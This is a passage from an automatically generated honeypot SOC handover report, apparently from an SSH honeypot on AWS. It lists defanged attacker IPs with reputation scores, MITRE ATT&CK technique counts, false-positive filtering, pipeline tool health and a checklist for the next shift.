| `157.245.243[.]118` | US | DigitalOcean, LLC | **100** ⚠️ | 20 |
| `38.19.156[.]18` | PE | ON EMPRESAS S.A.C. | **100** ⚠️ | 50 |
| `101.126.91[.]34` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `102.210.149[.]130` | KE | New IP First Block2 | **100** ⚠️ | 9 |
| `14.103.37[.]34` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `115.190.87[.]35` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 0 |
| `52.159.247[.]225` | US | Microsoft Corporation | 18 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 94 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 39 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 38 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 20 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 20 |

---

## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 18 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 96 cases |
| Tool 34  | Credential Extractor        | ✅ 77 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 7 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (1.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 6 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 38 priority case(s) shown individually · 6 recon entry/entries in table (4 group(s) consolidating 55 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-07T16:56:44Z_
